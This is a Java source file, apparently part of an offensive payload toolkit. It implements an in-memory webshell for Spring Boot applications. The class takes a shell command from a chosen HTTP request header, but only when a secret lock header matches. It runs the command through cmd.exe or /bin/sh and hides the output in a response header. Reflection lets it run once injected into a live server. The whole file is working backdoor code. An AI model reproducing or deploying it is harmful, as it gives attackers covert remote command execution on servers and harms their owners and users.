package com.ppp.middleware.memshell;

import com.ppp.annotation.JavaClassModifiable;
import com.ppp.annotation.MemShell;
import com.ppp.annotation.MemShellFunction;

import java.io.InputStream;
import java.lang.reflect.Method;

/**
 * @author Whoopsunix
 * <p>
 * Version test
 * spring-boot-starter-web
 * [2.2.x, 2.7.x]
 */
@MemShell(MemShell.Controller)
@MemShellFunction(MemShellFunction.Exec)
@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.RHEADER, JavaClassModifiable.lockHeaderKey, JavaClassModifiable.lockHeaderValue})
public class ControllerExec {
    private static String HEADER;
    private static String RHEADER;
    private static String lockHeaderKey;
    private static String lockHeaderValue;

    public ControllerExec() {
    }

    public static String run() {
        try {
            Object requestAttributes = invokeMethod(Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder"), null, "getRequestAttributes", new Class[]{}, new Object[]{});
            Class clazz = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.ServletRequestAttributes");
            Object request = invokeMethod(clazz, requestAttributes, "getRequest", new Class[]{}, new Object[]{});
            Object response = invokeMethod(clazz, requestAttributes, "getResponse", new Class[]{}, new Object[]{});

            String lv = (String) invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{lockHeaderKey});
            if (lv == null || !lv.contains(lockHeaderValue)) {
                return "";
            }

            Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
            String result = exec((String) header);
            invokeMethod(response, "setHeader", new Class[]{String.class, String.class}, new Object[]{RHEADER, result});
//            invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
//            Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
//            invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
//            invokeMethod(writer, "flush", new Class[]{}, new Object[]{});
//            invokeMethod(writer, "close", new Class[]{}, new Object[]{});
        } catch (Throwable e) {

        }
        return "";
    }

    public static String exec(String str) throws Exception {
        String[] cmd;
        if (System.getProperty("os.name").toLowerCase().contains("win")) {
            cmd = new String[]{"cmd.exe", "/c", str};
        } else {
            cmd = new String[]{"/bin/sh", "-c", str};
        }
        InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();

        // result
        byte[] bytes = new byte[1024];
        int len;
        StringBuilder stringBuilder = new StringBuilder();
        while ((len = inputStream.read(bytes)) != -1) {
            stringBuilder.append(new String(bytes, 0, len));
        }
        return stringBuilder.toString();
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        try {
            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
        } catch (Exception e) {
            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
        }
    }

    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method = cls.getDeclaredMethod(methodName, argsClass);
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }


}
